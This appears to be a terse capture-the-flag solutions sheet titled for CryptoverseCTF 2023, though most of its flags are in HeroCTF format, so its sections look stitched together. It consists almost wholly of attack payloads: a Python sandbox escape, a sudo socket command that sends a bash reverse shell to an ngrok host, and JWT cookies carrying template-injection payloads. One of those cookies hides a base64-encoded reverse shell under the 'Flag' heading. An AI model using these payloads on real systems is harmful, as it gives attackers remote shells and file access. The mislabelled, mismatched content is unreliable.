# CryptoverseCTF 2023

Team: ACTFA

## Overview

```
Title                      Category             Points  Flag
-------------------------- -------------------  ------- -----------------------------
Warmup 1                   Crypto               173     cvctf{base58_with_rot}
```

## Misc : PyJail

**Challenge**  

**Solution**  
https://ctftime.org/writeup/23298

print([''.__class__.__base__.__subclasses__()[132].__init__.__globals__["system"]("cat pyjail.py")])

**Flag**  
```
Hero{nooooo_y0u_3sc4p3d!!}
```

## System : chm0d

**Challenge**

**Solution**
perl -e 'chmod 0755, "flag.txt"'

**Flag**
```
Hero{chmod_1337_would_have_been_easier}
```

## System : SUDOkLu

**Challenge**

**Solution**
sudo -u privilegeduser /usr/bin/socket -p "/bin/bash" 0.tcp.ap.ngrok.io 13256

**Flag**
```
Hero{ch3ck_f0r_m1sc0nf1gur4t1on5}
```

## Web : Drink From my Flask

**Challenges**

**Solution**
SSTI di cookies
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3tsaXBzdW0uX19nbG9iYWxzX19bJ29zJ10ucG9wZW4oJ2NhdCBmbGFnLnR4dCcpLnJlYWQoKX19In0.cMJOq4-LlT2sMEvPgoNENZX_L0pu6c4ECnOvgoomO0g

**Flag**

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoie3snJy5fX2NsYXNzX18ubXJvKClbMV0uX19zdWJjbGFzc2VzX18oKVs0MDRdKCdlY2hvIGMyZ2dMV2tnUGlZZ0wyUmxkaTkwWTNBdk1DNTBZM0F1WVhBdWJtZHliMnN1YVc4dk1UazBOalVnTUQ0bU1Rbz0gfCBiYXNlNjQgLWQgfCBiYXNoJyxzaGVsbD1UcnVlLHN0ZG91dD0tMSkuY29tbXVuaWNhdGUoKX19In0.B9pKN_5Esx-GskkSI8_f4WBFXojK4mXHORezj6kDe3Q